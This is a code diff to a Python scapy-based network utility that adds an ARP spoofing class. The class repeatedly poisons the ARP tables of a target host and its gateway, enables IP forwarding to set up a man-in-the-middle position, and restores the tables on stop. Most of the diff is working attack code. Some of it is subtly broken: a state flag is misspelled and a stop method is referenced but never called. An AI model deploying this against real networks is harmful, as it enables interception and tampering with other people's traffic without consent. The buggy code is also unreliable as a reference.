@@ -1,4 +1,4 @@
-from scapy.all import srp, Ether, ARP, conf, sniff, IP, TCP, UDP, Raw, PcapWriter
+from scapy.all import srp, Ether, ARP, conf, sniff, IP, TCP, UDP, Raw, PcapWriter, send
 from scapy.utils import PcapWriter
 import socket
 import json
@@ -7,6 +7,7 @@ from threading import Thread, Event
 from typing import List, Optional, Callable
 import sys
 import time
+from getmac import get_mac_address
 
 conf.use_pcap = True
 
@@ -352,7 +353,154 @@ class IPSniffer:
     @property
     def packet_count(self) -> int:
         return self._packet_count
+    
+class ARPSpoofing:
+    def __init__(self,
+        target_ip: str, # IP Target
+        gateway_ip: str, # IP Gateway
+        iface: Optional[str] = None, # Network interface, jika tidak ada set dfault None
+        interval: float = 2.0):
 
+        self.target_ip = target_ip
+        self.gateway_ip = gateway_ip
+        self.iface = iface
+        self.interval = interval
+        
+        # Var untuk menyimpan MAC
+        self.target_mac = None
+        self.gateway_mac = None
+        
+        # Control Flag
+        self._runnning = False
+        self._poisoned = False
+        
+        conf.verb = 0
+        
+        print("[ARPSpoofing] initialized ✓ ")
+        print(f"Target IP: {self.target_ip}")
+        print(f"Gateway IP: {self.gateway_ip}")
+        print(f"Interface: {self.iface}")
+        
+    def _spoof(self, target_ip: str, spoof_ip: str, target_mac: str):
+        packet = ARP(op=2, # ARP reply
+                     pdst=target_ip, # Target IP
+                     hwdst=target_mac, # Target MAC
+                     psrc=spoof_ip) #source ip
+                    
+                    #hwsrc adalah mac kita
+        
+        send(packet, iface=self.iface, verbose=False)
+     
+    def _restore(self, dest_ip: str, source_ip: str, dest_mac: str, source_mac: str):   
+        packet = ARP(op=2, # ARP reply
+                     pdst=dest_ip, # Target IP
+                     hwdst=dest_mac, # Target MAC
+                     psrc=source_ip, #source ip
+                     hwsrc=source_mac) #source mac
+        
+        send(packet, iface=self.iface, count = 5, verbose=False)
+    
+    def enable_ip_forwarding(self): 
+        try: 
+            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                f.write("1\n")
+                print("[ARPSpoofing] ✓ IP forwarding enabled")
+        except Exception as e:
+            print(f"[ARPSpoofer] ✗ Failed to enable IP forwarding: {e}")
+            print("  Try manually: echo 1 > /proc/sys/net/ipv4/ip_forward")
+            return False
+    
+    def disable_ip_forwarding(self):
+        try:
+            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+                f.write("0\n")
+                print("[ARPSpoofing] ✓ IP forwarding disabled")
+        except Exception as e:
+            print(f"[ARPSpoofing] ✗ Failed to disable IP forwarding: {e}")
+            print("  Try manually: echo 0 > /proc/sys/net/ipv4/ip_forward")
+            return False
+    
+    def start(self, enable_forwarding: bool = True):
+        if self._runnning :
+            print("[ARPSpoofer] Already running!")
+            return
+        
+        print("\n[ARPSpoofer] Starting ARP poisoning attack...")     
+        
+        self.target_mac = str(get_mac_address(ip=str(self.target_ip), network_request=True))
+        self.gateway_mac = str(get_mac_address(ip=str(self.gateway_ip), network_request=True))
+        
+        if not self.target_mac:
+            print(f"[ARPSpoofer] ✗ Could not find target MAC for {self.target_ip}")
+            return False
+        
+        if not self.gateway_mac:
+            print(f"[ARPSpoofer] ✗ Could not find gateway MAC for {self.gateway_ip}")
+            return False
+        
+        if enable_forwarding:
+            self.enable_ip_forwarding()
+            
+        self._runnning = True
+        self._poisoned = True
+        
+        print(f"\n[ARPSpoofer] ✓ Poisoning started!")
+        print(f"  Telling {self.target_ip} that {self.gateway_ip} is at our MAC")
+        print(f"  Telling {self.gateway_ip} that {self.target_ip} is at our MAC")
+        print(f"  Sending ARP packets every {self.interval}s")
+        print(f"\n[ARPSpoofer] Press Ctrl+C to stop and restore ARP tables\n")
+        
+        try:
+            packet_count = 0
+            while self._runnning:
+                # Poison target (tell target that gateway is at our MAC)
+                self._spoof(self.target_ip, self.gateway_ip, self.target_mac)
+                
+                # Poison gateway (tell gateway that target is at our MAC
+                self._spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
+                
+                packet_count += 2
+                print(f"[ARPSpoofer] Sent {packet_count} ARP packets...", end="\r")
+                
+                time.sleep(self.interval)
+        except KeyboardInterrupt:
+            print("\n[ARPSpoofer] Interrupted by user")
+        finally:
+            self.stop
+        return True
+    
+    def stop(self):
+        """
+        Stop ARP poisoning and restore original ARP tables
+        """
+        if not self._running and not self._poisoned:
+            print("[ARPSpoofer] Not running")
+            return
+        
+        self._running = False
+        
+        if self._poisoned and self.target_mac and self.gateway_mac:
+            print("\n[ARPSpoofer] Restoring ARP tables...")
+            
+            # Restore target's ARP table
+            print(f"  Restoring {self.target_ip}'s ARP table...")
+            self._restore(self.target_ip, self.gateway_ip,
+                         self.target_mac, self.gateway_mac)
+            
+            # Restore gateway's ARP table  
+            print(f"  Restoring {self.gateway_ip}'s ARP table...")
+            self._restore(self.gateway_ip, self.target_ip,
+                         self.gateway_mac, self.target_mac)
+            
+            print("[ARPSpoofer] ✓ ARP tables restored")
+            self._poisoned = False
+        
+        print("[ARPSpoofer] Stopped")
+    
+    @property
+    def is_running(self) -> bool:
+        return self._running
+    
 if __name__ == "__main__":
     # Test ARP scan
     print("Testing ARP scan...")
